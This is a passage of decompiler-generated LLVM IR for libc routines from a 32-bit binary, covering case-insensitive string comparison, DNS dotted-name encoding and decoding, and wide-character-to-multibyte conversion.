  uselistorder i32 %arg1, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_804ecfd, { 1, 0 }
  uselistorder label %dec_label_pc_804ecf2, { 1, 0 }
  uselistorder label %dec_label_pc_804ecd6, { 1, 0 }
  uselistorder label %dec_label_pc_804ecae, { 1, 0 }
  uselistorder label %dec_label_pc_804ec6d, { 1, 0 }
}

define i32 @__GI_strcasecmp(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v4_804ed0a = ptrtoint i8* %arg1 to i32
  store i32 %v4_804ed0a, i32* @ecx, align 4
  %v0_804ed14 = load i32, i32* bitcast (i32** @global_var_80522d4.113 to i32*), align 4
  br label %dec_label_pc_804ed1a

dec_label_pc_804ed1a:                             ; preds = %dec_label_pc_804ed37, %entry
  %v0_804ed3d6 = phi i32 [ %v0_804ed3d7, %dec_label_pc_804ed37 ], [ 0, %entry ]
  %v0_804ed37 = phi i32 [ %v1_804ed37, %dec_label_pc_804ed37 ], [ %arg2, %entry ]
  %v0_804ed38 = phi i32 [ %v1_804ed38, %dec_label_pc_804ed37 ], [ %v4_804ed0a, %entry ]
  %v12_804ed1a = icmp eq i32 %v0_804ed38, %v0_804ed37
  %.pre = inttoptr i32 %v0_804ed38 to i8*
  br i1 %v12_804ed1a, label %dec_label_pc_804ed32, label %dec_label_pc_804ed1e

dec_label_pc_804ed1e:                             ; preds = %dec_label_pc_804ed1a
  %v2_804ed1e = load i8, i8* %.pre, align 1
  %v3_804ed1e = zext i8 %v2_804ed1e to i32
  %v2_804ed21 = mul nuw nsw i32 %v3_804ed1e, 2
  %v3_804ed21 = add i32 %v2_804ed21, %v0_804ed14
  %v4_804ed21 = inttoptr i32 %v3_804ed21 to i16*
  %v5_804ed21 = load i16, i16* %v4_804ed21, align 2
  %v6_804ed21 = sext i16 %v5_804ed21 to i32
  %v1_804ed25 = inttoptr i32 %v0_804ed37 to i8*
  %v2_804ed25 = load i8, i8* %v1_804ed25, align 1
  %v3_804ed25 = zext i8 %v2_804ed25 to i32
  %v2_804ed28 = mul nuw nsw i32 %v3_804ed25, 2
  %v3_804ed28 = add i32 %v2_804ed28, %v0_804ed14
  %v4_804ed28 = inttoptr i32 %v3_804ed28 to i16*
  %v5_804ed28 = load i16, i16* %v4_804ed28, align 2
  %v6_804ed28 = sext i16 %v5_804ed28 to i32
  %v2_804ed2c = sub nsw i32 %v6_804ed21, %v6_804ed28
  %v12_804ed2c = icmp eq i32 %v2_804ed2c, 0
  store i32 %v2_804ed2c, i32* @edx, align 4
  %v1_804ed30 = icmp eq i1 %v12_804ed2c, false
  br i1 %v1_804ed30, label %dec_label_pc_804ed3b, label %dec_label_pc_804ed32

dec_label_pc_804ed32:                             ; preds = %dec_label_pc_804ed1a, %dec_label_pc_804ed1e
  %v0_804ed3d7 = phi i32 [ %v2_804ed2c, %dec_label_pc_804ed1e ], [ %v0_804ed3d6, %dec_label_pc_804ed1a ]
  %v2_804ed32 = load i8, i8* %.pre, align 1
  %v3_804ed32 = icmp eq i8 %v2_804ed32, 0
  br i1 %v3_804ed32, label %dec_label_pc_804ed3b, label %dec_label_pc_804ed37

dec_label_pc_804ed37:                             ; preds = %dec_label_pc_804ed32
  %v1_804ed37 = add i32 %v0_804ed37, 1
  %v1_804ed38 = add i32 %v0_804ed38, 1
  store i32 %v1_804ed38, i32* @ecx, align 4
  br label %dec_label_pc_804ed1a

dec_label_pc_804ed3b:                             ; preds = %dec_label_pc_804ed32, %dec_label_pc_804ed1e
  %v0_804ed3d = phi i32 [ %v0_804ed3d7, %dec_label_pc_804ed32 ], [ %v2_804ed2c, %dec_label_pc_804ed1e ]
  ret i32 %v0_804ed3d

; uselistorder directives
  uselistorder i32 %v1_804ed38, { 1, 0 }
  uselistorder i32 %v0_804ed3d7, { 1, 0 }
  uselistorder i32 %v2_804ed2c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804ed38, { 2, 1, 0 }
  uselistorder i32 %v0_804ed37, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804ed32, { 1, 0 }
}

define i32 @__encode_dotted(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %v0_804ed41 = load i32, i32* @edi, align 4
  %v0_804ed42 = load i32, i32* @esi, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v4_804ed49 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804ed49, i32* @edi, align 4
  %v1_804eda85 = icmp eq i8* %arg1, null
  br i1 %v1_804eda85, label %dec_label_pc_804edb1, label %dec_label_pc_804edac.lr.ph

dec_label_pc_804edac.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_804edac

dec_label_pc_804ed4f:                             ; preds = %dec_label_pc_804edac
  %v5_804ed54 = call i32 @__GI_strchr(i8* %v1_804edac, i32 46)
  %v1_804ed5e = icmp eq i32 %v5_804ed54, 0
  br i1 %v1_804ed5e, label %dec_label_pc_804ed68, label %dec_label_pc_804ed62

dec_label_pc_804ed62:                             ; preds = %dec_label_pc_804ed4f
  %v1_804ed64 = load i32, i32* @edi, align 4
  %v2_804ed64 = sub i32 %v5_804ed54, %v1_804ed64
  br label %dec_label_pc_804ed76

dec_label_pc_804ed68:                             ; preds = %dec_label_pc_804ed4f
  %v0_804ed6b = load i32, i32* @edi, align 4
  %v5_804ed6b = inttoptr i32 %v0_804ed6b to i8*
  %v3_804ed6c = call i32 @strlen(i8* %v5_804ed6b)
  br label %dec_label_pc_804ed76

dec_label_pc_804ed76:                             ; preds = %dec_label_pc_804ed62, %dec_label_pc_804ed68
  %v0_804ed89 = phi i32 [ %v2_804ed64, %dec_label_pc_804ed62 ], [ %v3_804ed6c, %dec_label_pc_804ed68 ]
  store i32 %v0_804ed89, i32* @esi, align 4
  %v1_804ed76 = icmp eq i32 %v0_804ed89, 0
  %v3_804ed76 = trunc i32 %v0_804ed89 to i8
  br i1 %v1_804ed76, label %dec_label_pc_804edc5, label %dec_label_pc_804ed7a

dec_label_pc_804ed7a:                             ; preds = %dec_label_pc_804ed76
  %v1_804ed7e = load i32, i32* %ebx.global-to-local, align 4
  %v2_804ed7e = sub i32 %arg3, %v1_804ed7e
  %v1_804ed80 = add i32 %v2_804ed7e, -1
  %v7_804ed81 = icmp ult i32 %v0_804ed89, %v1_804ed80
  %v1_804ed83 = icmp eq i1 %v7_804ed81, false
  br i1 %v1_804ed83, label %dec_label_pc_804edc5, label %dec_label_pc_804ed85

dec_label_pc_804ed85:                             ; preds = %dec_label_pc_804ed7a
  store i32 %arg2, i32* @edx, align 4
  %v4_804ed8b = add i32 %v1_804ed7e, %arg2
  %v5_804ed8b = inttoptr i32 %v4_804ed8b to i8*
  store i8 %v3_804ed76, i8* %v5_804ed8b, align 1
  %v0_804ed8e = load i32, i32* %ebx.global-to-local, align 4
  %v1_804ed8e = add i32 %v0_804ed8e, 1
  %v0_804ed90 = load i32, i32* @edx, align 4
  %v2_804ed92 = add i32 %v1_804ed8e, %v0_804ed90
  %v0_804ed94 = load i32, i32* @esi, align 4
  %v0_804ed95 = load i32, i32* @edi, align 4
  %v2_804ed97 = add i32 %v0_804ed94, %v1_804ed8e
  store i32 %v2_804ed97, i32* %ebx.global-to-local, align 4
  %tmp30 = inttoptr i32 %v2_804ed92 to i16*
  %v7_804ed99 = call i32 @memcpy(i16* %tmp30, i32 %v0_804ed95, i32 %v0_804ed94)
  %v1_804eda5 = add i32 %v5_804ed54, 1
  br i1 %v1_804ed5e, label %dec_label_pc_804edb1, label %dec_label_pc_804eda8

dec_label_pc_804eda8:                             ; preds = %dec_label_pc_804ed85
  store i32 %v1_804eda5, i32* @edi, align 4
  %v1_804eda8 = icmp eq i32 %v1_804eda5, 0
  br i1 %v1_804eda8, label %dec_label_pc_804edb1, label %dec_label_pc_804edac

dec_label_pc_804edac:                             ; preds = %dec_label_pc_804edac.lr.ph, %dec_label_pc_804eda8
  %v0_804ed53 = phi i32 [ %v4_804ed49, %dec_label_pc_804edac.lr.ph ], [ %v1_804eda5, %dec_label_pc_804eda8 ]
  %v1_804edac = inttoptr i32 %v0_804ed53 to i8*
  %v2_804edac = load i8, i8* %v1_804edac, align 1
  %v3_804edac = icmp eq i8 %v2_804edac, 0
  %v1_804edaf = icmp eq i1 %v3_804edac, false
  br i1 %v1_804edaf, label %dec_label_pc_804ed4f, label %dec_label_pc_804edb1

dec_label_pc_804edb1:                             ; preds = %dec_label_pc_804eda8, %dec_label_pc_804edac, %dec_label_pc_804ed85, %entry
  %tmp31 = icmp slt i32 %arg3, 1
  br i1 %tmp31, label %dec_label_pc_804edc5, label %dec_label_pc_804edb8

dec_label_pc_804edb8:                             ; preds = %dec_label_pc_804edb1
  %v1_804edbc = load i32, i32* %ebx.global-to-local, align 4
  %v2_804edbc = add i32 %v1_804edbc, %arg2
  %v3_804edbc = inttoptr i32 %v2_804edbc to i8*
  store i8 0, i8* %v3_804edbc, align 1
  %v0_804edc0 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804edc0 = add i32 %v0_804edc0, 1
  br label %dec_label_pc_804edc8

dec_label_pc_804edc5:                             ; preds = %dec_label_pc_804ed7a, %dec_label_pc_804ed76, %dec_label_pc_804edb1
  br label %dec_label_pc_804edc8

dec_label_pc_804edc8:                             ; preds = %dec_label_pc_804edb8, %dec_label_pc_804edc5
  %storemerge3 = phi i32 [ %v1_804edc0, %dec_label_pc_804edb8 ], [ -1, %dec_label_pc_804edc5 ]
  store i32 %v0_804ed42, i32* @esi, align 4
  store i32 %v0_804ed41, i32* @edi, align 4
  ret i32 %storemerge3

; uselistorder directives
  uselistorder i8* %v1_804edac, { 1, 0 }
  uselistorder i32 %v1_804eda5, { 0, 2, 1 }
  uselistorder i32 %v0_804ed94, { 1, 0 }
  uselistorder i1 %v1_804ed5e, { 1, 0 }
  uselistorder i32 %v5_804ed54, { 2, 0, 1 }
  uselistorder i32* %ebx.global-to-local, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 (i8*)* @strlen, { 4, 7, 6, 1, 8, 0, 5, 3, 2 }
  uselistorder i32 (i8*, i32)* @__GI_strchr, { 3, 4, 5, 0, 1, 2, 6 }
  uselistorder i32 46, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_804edc8, { 1, 0 }
  uselistorder label %dec_label_pc_804edc5, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804edb1, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_804edac, { 1, 0 }
  uselistorder label %dec_label_pc_804ed76, { 1, 0 }
}

define i32 @__decode_dotted(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %v0_804edd2 = load i32, i32* @esi, align 4
  store i32 %arg2, i32* @edx, align 4
  %v4_804eddb = icmp eq i32 %arg1, 0
  br i1 %v4_804eddb, label %dec_label_pc_804ee9c, label %dec_label_pc_804ede6

dec_label_pc_804ede6:                             ; preds = %entry
  store i32 0, i32* %ebp.global-to-local, align 4
  store i32 0, i32* @ecx, align 4
  %v2_804ee842740 = add i32 %arg2, %arg1
  %v3_804ee842841 = inttoptr i32 %v2_804ee842740 to i8*
  %v4_804ee842942 = load i8, i8* %v3_804ee842841, align 1
  %v1_804ee883144 = icmp eq i8 %v4_804ee842942, 0
  %v1_804ee8a3245 = icmp eq i1 %v1_804ee883144, false
  br i1 %v1_804ee8a3245, label %dec_label_pc_804edf4.lr.ph, label %dec_label_pc_804ee90

dec_label_pc_804edf4:                             ; preds = %dec_label_pc_804edf4.lr.ph, %dec_label_pc_804ee0d
  %v0_804edfe = phi i32 [ %v0_804edfe.pre, %dec_label_pc_804edf4.lr.ph ], [ %v4_804ee18, %dec_label_pc_804ee0d ]
  %v8_804edf438 = phi i1 [ %v8_804edf43350, %dec_label_pc_804edf4.lr.ph ], [ true, %dec_label_pc_804ee0d ]
  %v5_804ee8437.in = phi i8 [ %v5_804ee843049.in, %dec_label_pc_804edf4.lr.ph ], [ %v4_804ee84, %dec_label_pc_804ee0d ]
  %stack_var_-17.136 = phi i8 [ %stack_var_-17.1.ph48, %dec_label_pc_804edf4.lr.ph ], [ 0, %dec_label_pc_804ee0d ]
  %v0_804edfb35 = phi i32 [ %v0_804edfb.ph46, %dec_label_pc_804edf4.lr.ph ], [ %v2_804ee27, %dec_label_pc_804ee0d ]
  %v5_804ee8437 = zext i8 %v5_804ee8437.in to i32
  %v1_804edfb = add i32 %v0_804edfb35, 1
  store i32 %v1_804edfb, i32* @esi, align 4
  %v3_804edfe = select i1 %v8_804edf438, i32 2, i32 1
  %v4_804edfe = add i32 %v3_804edfe, %v0_804edfe
  store i32 %v4_804edfe, i32* %ebp.global-to-local, align 4
  %v1_804ee01 = and i32 %v5_804ee8437, 192
  %v6_804ee06 = icmp eq i32 %v1_804ee01, 192
  %v1_804ee0b = icmp eq i1 %v6_804ee06, false
  br i1 %v1_804ee0b, label %dec_label_pc_804ee30, label %dec_label_pc_804ee0d

dec_label_pc_804ee0d:                             ; preds = %dec_label_pc_804edf4
  %v4_804ee18 = add i32 %v3_804edfe, %v4_804edfe
  store i32 %v4_804ee18, i32* %ebp.global-to-local, align 4
  %tmp = urem i8 %v5_804ee8437.in, 64
  %v1_804ee1b = zext i8 %tmp to i32
  %v2_804ee1e = add i32 %v1_804edfb, %arg1
  %v3_804ee1e = inttoptr i32 %v2_804ee1e to i8*
  %v4_804ee1e = load i8, i8* %v3_804ee1e, align 1
  %v5_804ee1e = zext i8 %v4_804ee1e to i32
  %v2_804ee22 = mul nuw nsw i32 %v1_804ee1b, 256
  %v2_804ee27 = or i32 %v5_804ee1e, %v2_804ee22
  store i32 %v2_804ee27, i32* @edx, align 4
  store i32 %v1_804ee4d.ph47, i32* @ecx, align 4
  %v2_804ee84 = add i32 %v2_804ee27, %arg1
  %v3_804ee84 = inttoptr i32 %v2_804ee84 to i8*
  %v4_804ee84 = load i8, i8* %v3_804ee84, align 1
  %v1_804ee88 = icmp eq i8 %v4_804ee84, 0
  %v1_804ee8a = icmp eq i1 %v1_804ee88, false
  br i1 %v1_804ee8a, label %dec_label_pc_804edf4, label %dec_label_pc_804ee90

dec_label_pc_804ee30:                             ; preds = %dec_label_pc_804edf4
  %v2_804ee30 = add i32 %v5_804ee8437, %v1_804ee4d.ph47
  %v1_804ee39 = add i32 %v2_804ee30, 1
  store i32 %v1_804ee39, i32* @edi, align 4
  %v10_804ee3a = icmp ult i32 %v1_804ee39, %arg4
  %v1_804ee3e = icmp eq i1 %v10_804ee3a, false
  br i1 %v1_804ee3e, label %dec_label_pc_804ee9c, label %dec_label_pc_804ee40

dec_label_pc_804ee40:                             ; preds = %dec_label_pc_804ee30
  %v2_804ee46 = add i32 %v1_804edfb, %arg1
  %v2_804ee4d = add i32 %v1_804ee4d.ph47, %arg3
  %v3_804ee50 = inttoptr i32 %v2_804ee4d to i16*
  %v4_804ee50 = call i32 @memcpy(i16* %v3_804ee50, i32 %v2_804ee46, i32 %v5_804ee8437)
  %v0_804ee58 = load i32, i32* @esi, align 4
  %v2_804ee58 = add i32 %v0_804ee58, %v5_804ee8437
  store i32 %v2_804ee58, i32* @edx, align 4
  br i1 %v8_804edf438, label %dec_label_pc_804ee64, label %dec_label_pc_804ee62

dec_label_pc_804ee62:                             ; preds = %dec_label_pc_804ee40
  %v0_804ee62 = load i32, i32* %ebp.global-to-local, align 4
  %v2_804ee62 = add i32 %v0_804ee62, %v5_804ee8437
  store i32 %v2_804ee62, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804ee64

dec_label_pc_804ee64:                             ; preds = %dec_label_pc_804ee40, %dec_label_pc_804ee62
  %v4_804ee7b = add i32 %v2_804ee30, %arg3
  %v5_804ee7b = inttoptr i32 %v4_804ee7b to i8*
  store i8 46, i8* %v5_804ee7b, align 1
  %v0_804ee7e.pre = load i32, i32* @edi, align 4
  %v1_804ee84.pre.pre = load i32, i32* @edx, align 4
  store i32 %v0_804ee7e.pre, i32* @ecx, align 4
  %v2_804ee8427 = add i32 %v1_804ee84.pre.pre, %arg1
  %v3_804ee8428 = inttoptr i32 %v2_804ee8427 to i8*
  %v4_804ee8429 = load i8, i8* %v3_804ee8428, align 1
  %v1_804ee8831 = icmp eq i8 %v4_804ee8429, 0
  %v1_804ee8a32 = icmp eq i1 %v1_804ee8831, false
  %v8_804edf433 = icmp eq i8 %stack_var_-17.136, 0
  %v0_804edfe.pre.pre = load i32, i32* %ebp.global-to-local, align 4
  br i1 %v1_804ee8a32, label %dec_label_pc_804edf4.lr.ph, label %dec_label_pc_804ee90

dec_label_pc_804edf4.lr.ph:                       ; preds = %dec_label_pc_804ee64, %dec_label_pc_804ede6
  %v0_804edfe.pre = phi i32 [ 0, %dec_label_pc_804ede6 ], [ %v0_804edfe.pre.pre, %dec_label_pc_804ee64 ]
  %v8_804edf43350 = phi i1 [ false, %dec_label_pc_804ede6 ], [ %v8_804edf433, %dec_label_pc_804ee64 ]
  %v5_804ee843049.in = phi i8 [ %v4_804ee842942, %dec_label_pc_804ede6 ], [ %v4_804ee8429, %dec_label_pc_804ee64 ]
  %stack_var_-17.1.ph48 = phi i8 [ 1, %dec_label_pc_804ede6 ], [ %stack_var_-17.136, %dec_label_pc_804ee64 ]
  %v1_804ee4d.ph47 = phi i32 [ 0, %dec_label_pc_804ede6 ], [ %v0_804ee7e.pre, %dec_label_pc_804ee64 ]
  %v0_804edfb.ph46 = phi i32 [ %arg2, %dec_label_pc_804ede6 ], [ %v1_804ee84.pre.pre, %dec_label_pc_804ee64 ]
  br label %dec_label_pc_804edf4

dec_label_pc_804ee90:                             ; preds = %dec_label_pc_804ee64, %dec_label_pc_804ee0d, %dec_label_pc_804ede6
  %v0_804ee95 = phi i32 [ 0, %dec_label_pc_804ede6 ], [ %v4_804ee18, %dec_label_pc_804ee0d ], [ %v0_804edfe.pre.pre, %dec_label_pc_804ee64 ]
  %v8_804edf4.lcssa = phi i1 [ false, %dec_label_pc_804ede6 ], [ true, %dec_label_pc_804ee0d ], [ %v8_804edf433, %dec_label_pc_804ee64 ]
  %v2_804ee97 = zext i1 %v8_804edf4.lcssa to i32
  %v3_804ee97 = add i32 %v0_804ee95, 1
  %v4_804ee97 = add i32 %v3_804ee97, %v2_804ee97
  br label %dec_label_pc_804ee9f

dec_label_pc_804ee9c:                             ; preds = %dec_label_pc_804ee30, %entry
  br label %dec_label_pc_804ee9f

dec_label_pc_804ee9f:                             ; preds = %dec_label_pc_804ee90, %dec_label_pc_804ee9c
  %storemerge = phi i32 [ %v4_804ee97, %dec_label_pc_804ee90 ], [ -1, %dec_label_pc_804ee9c ]
  store i32 %v0_804edd2, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_804ee4d.ph47, { 2, 1, 0 }
  uselistorder i8 %v4_804ee84, { 1, 0 }
  uselistorder i32 %v2_804ee27, { 0, 2, 1 }
  uselistorder i32 %v4_804ee18, { 0, 2, 1 }
  uselistorder i32 %v5_804ee8437, { 4, 3, 1, 2, 0 }
  uselistorder i32* %ebp.global-to-local, { 2, 0, 3, 1, 4, 5 }
  uselistorder i8 1, { 1, 4, 5, 7, 2, 6, 0, 3 }
  uselistorder i8 46, { 4, 0, 5, 1, 2, 3 }
  uselistorder i32 %arg1, { 1, 3, 2, 4, 0, 5 }
  uselistorder label %dec_label_pc_804ee9f, { 1, 0 }
  uselistorder label %dec_label_pc_804ee64, { 1, 0 }
}

define i32 @__length_dotted(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_804eeb6 = icmp eq i32 %arg1, 0
  br i1 %v1_804eeb6, label %dec_label_pc_804eee5, label %dec_label_pc_804eed6.preheader

dec_label_pc_804eed6.preheader:                   ; preds = %entry
  store i32 %arg2, i32* @ecx, align 4
  %v2_804eed610 = add i32 %arg2, %arg1
  %v3_804eed611 = inttoptr i32 %v2_804eed610 to i8*
  %v4_804eed612 = load i8, i8* %v3_804eed611, align 1
  %v1_804eeda14 = add i32 %arg2, 1
  %v1_804eedd15 = icmp eq i8 %v4_804eed612, 0
  %v1_804eedf16 = icmp eq i1 %v1_804eedd15, false
  br i1 %v1_804eedf16, label %dec_label_pc_804eec5, label %dec_label_pc_804eee1

dec_label_pc_804eebc:                             ; preds = %dec_label_pc_804eec5
  %v1_804eebc = add i32 %v0_804eebc17, 2
  br label %dec_label_pc_804eee1

dec_label_pc_804eec5:                             ; preds = %dec_label_pc_804eed6.preheader, %dec_label_pc_804eed6
  %v1_804eeda19 = phi i32 [ %v1_804eeda, %dec_label_pc_804eed6 ], [ %v1_804eeda14, %dec_label_pc_804eed6.preheader ]
  %v5_804eed618.in = phi i8 [ %v4_804eed6, %dec_label_pc_804eed6 ], [ %v4_804eed612, %dec_label_pc_804eed6.preheader ]
  %v0_804eebc17 = phi i32 [ %v2_804eed3, %dec_label_pc_804eed6 ], [ %arg2, %dec_label_pc_804eed6.preheader ]
  %v5_804eed618 = zext i8 %v5_804eed618.in to i32
  %v1_804eec7 = and i32 %v5_804eed618, 192
  %v6_804eecc = icmp eq i32 %v1_804eec7, 192
  %v2_804eed3 = add i32 %v5_804eed618, %v1_804eeda19
  br i1 %v6_804eecc, label %dec_label_pc_804eebc, label %dec_label_pc_804eed6

dec_label_pc_804eed6:                             ; preds = %dec_label_pc_804eec5
  store i32 %v2_804eed3, i32* @ecx, align 4
  %v2_804eed6 = add i32 %v2_804eed3, %arg1
  %v3_804eed6 = inttoptr i32 %v2_804eed6 to i8*
  %v4_804eed6 = load i8, i8* %v3_804eed6, align 1
  %v1_804eeda = add i32 %v2_804eed3, 1
  %v1_804eedd = icmp eq i8 %v4_804eed6, 0
  %v1_804eedf = icmp eq i1 %v1_804eedd, false
  br i1 %v1_804eedf, label %dec_label_pc_804eec5, label %dec_label_pc_804eee1

dec_label_pc_804eee1:                             ; preds = %dec_label_pc_804eed6.preheader, %dec_label_pc_804eed6, %dec_label_pc_804eebc
  %v0_804eee1 = phi i32 [ %v1_804eebc, %dec_label_pc_804eebc ], [ %v1_804eeda14, %dec_label_pc_804eed6.preheader ], [ %v1_804eeda, %dec_label_pc_804eed6 ]
  %v2_804eee3 = sub i32 %v0_804eee1, %arg2
  br label %dec_label_pc_804eee5

dec_label_pc_804eee5:                             ; preds = %entry, %dec_label_pc_804eee1
  %v0_804eee8 = phi i32 [ -1, %entry ], [ %v2_804eee3, %dec_label_pc_804eee1 ]
  ret i32 %v0_804eee8

; uselistorder directives
  uselistorder i8 %v4_804eed6, { 1, 0 }
  uselistorder i32 %v2_804eed3, { 2, 3, 1, 0 }
  uselistorder i32 192, { 0, 2, 1, 3 }
  uselistorder i32 %arg2, { 4, 0, 1, 2, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804eee5, { 1, 0 }
  uselistorder label %dec_label_pc_804eee1, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804eec5, { 1, 0 }
}

define i32 @__GI_wcrtomb() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v1_804eef7 = icmp eq i32 %tmp5, 0
  %v1_804eef9 = icmp eq i1 %v1_804eef7, false
  br i1 %v1_804eef9, label %dec_label_pc_804ef01, label %dec_label_pc_804eefb

dec_label_pc_804eefb:                             ; preds = %entry
  %v2_804eefb = ptrtoint i32* %stack_var_-24 to i32
  br label %dec_label_pc_804ef01

dec_label_pc_804ef01:                             ; preds = %entry, %dec_label_pc_804eefb
  %v0_804ef1d = phi i32 [ %tmp5, %entry ], [ %v2_804eefb, %dec_label_pc_804eefb ]
  %v0_804ef05 = phi i32 [ %tmp4, %entry ], [ 0, %dec_label_pc_804eefb ]
  %v2_804ef01 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v0_804ef05, i32* %stack_var_-4, align 4
  store i32 %v2_804ef01, i32* %stack_var_-8, align 4
  %v2_804ef18 = ptrtoint i32* %stack_var_-8 to i32
  %v5_804ef1e = inttoptr i32 %v0_804ef1d to i8*
  %v6_804ef1e = call i32 @__GI_wcsnrtombs(i8* %v5_804ef1e, i32 %v2_804ef18, i32 1, i32 16, i32 %tmp)
  %v1_804ef26 = icmp eq i32 %v6_804ef1e, 0
  %v1_804ef28 = icmp eq i1 %v1_804ef26, false
  br i1 %v1_804ef28, label %dec_label_pc_804ef2c, label %dec_label_pc_804ef2a

dec_label_pc_804ef2a:                             ; preds = %dec_label_pc_804ef01
  %v1_804ef2a = and i32 %v6_804ef1e, -256
  %v2_804ef2a = or i32 %v1_804ef2a, 1
  br label %dec_label_pc_804ef2c

dec_label_pc_804ef2c:                             ; preds = %dec_label_pc_804ef01, %dec_label_pc_804ef2a
  %v0_804ef2f = phi i32 [ %v6_804ef1e, %dec_label_pc_804ef01 ], [ %v2_804ef2a, %dec_label_pc_804ef2a ]
  ret i32 %v0_804ef2f

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder label %dec_label_pc_804ef2c, { 1, 0 }
  uselistorder label %dec_label_pc_804ef01, { 1, 0 }
}

define i32 @__GI_wcsrtombs() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %v5_804ef45 = inttoptr i32 %tmp to i8*
  %v6_804ef45 = call i32 @__GI_wcsnrtombs(i8* %v5_804ef45, i32 %tmp1, i32 -1, i32 %tmp2, i32 %tmp3)
  ret i32 %v6_804ef45
}

define i32 @__GI_wcsnrtombs(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_804ef53 = load i32, i32* @ebx, align 4
  %v4_804ef57 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804ef57, i32* %edx.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  store i32 %arg4, i32* %eax.global-to-local, align 4
  %v1_804ef63 = icmp eq i8* %arg1, null
  br i1 %v1_804ef63, label %dec_label_pc_804ef97.thread, label %dec_label_pc_804ef67

dec_label_pc_804ef67:                             ; preds = %entry
  store i32 1, i32* %edi.global-to-local, align 4
  %v12_804ef6c = icmp eq i32 %v4_804ef57, %arg2
  %v1_804ef6e = icmp eq i1 %v12_804ef6c, false
  br i1 %v1_804ef6e, label %dec_label_pc_804ef97, label %dec_label_pc_804ef91

dec_label_pc_804ef97.thread:                      ; preds = %entry
  store i32 0, i32* %edi.global-to-local, align 4
  %v2_804ef74 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804ef74, i32* %edx.global-to-local, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804efa1

dec_label_pc_804ef7d:                             ; preds = %dec_label_pc_804efa8
  %v1_804ef7d = call i32 @__errno_location(i32 %v0_804ef53)
  store i32 %v1_804ef7d, i32* %eax.global-to-local, align 4
  %v1_804ef82 = inttoptr i32 %v1_804ef7d to i32*
  store i32 84, i32* %v1_804ef82, align 4
  br label %dec_label_pc_804efce

dec_label_pc_804ef8d:                             ; preds = %dec_label_pc_804efaf
  store i32 0, i32* %esi.global-to-local, align 4
  %v0_804efc3.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804efbf

dec_label_pc_804ef91:                             ; preds = %dec_label_pc_804ef67
  store i32 0, i32* %edi.global-to-local, align 4
  %v2_804ef93 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804ef93, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804ef97

dec_label_pc_804ef97:                             ; preds = %dec_label_pc_804ef67, %dec_label_pc_804ef91
  %v2_804efaf15 = phi i32 [ %v4_804ef57, %dec_label_pc_804ef67 ], [ %v2_804ef93, %dec_label_pc_804ef91 ]
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  %tmp33 = icmp ult i32 %arg4, %arg3
  br i1 %tmp33, label %dec_label_pc_804ef9f, label %dec_label_pc_804efa1

dec_label_pc_804ef9f:                             ; preds = %dec_label_pc_804ef97
  store i32 %arg4, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804efa1

dec_label_pc_804efa1:                             ; preds = %dec_label_pc_804ef97.thread, %dec_label_pc_804ef97, %dec_label_pc_804ef9f
  %v2_804efaf1532 = phi i32 [ %v2_804efaf15, %dec_label_pc_804ef97 ], [ %v2_804efaf15, %dec_label_pc_804ef9f ], [ %v2_804ef74, %dec_label_pc_804ef97.thread ]
  %v0_804efa4 = phi i32 [ %arg3, %dec_label_pc_804ef97 ], [ %arg4, %dec_label_pc_804ef9f ], [ %arg3, %dec_label_pc_804ef97.thread ]
  %v1_804efa1 = inttoptr i32 %arg2 to i32*
  %v2_804efa1 = load i32, i32* %v1_804efa1, align 4
  store i32 %v2_804efa1, i32* %esi.global-to-local, align 4
  store i32 %v0_804efa4, i32* @ecx, align 4
  %v1_804efbb3 = icmp eq i32 %v0_804efa4, 0
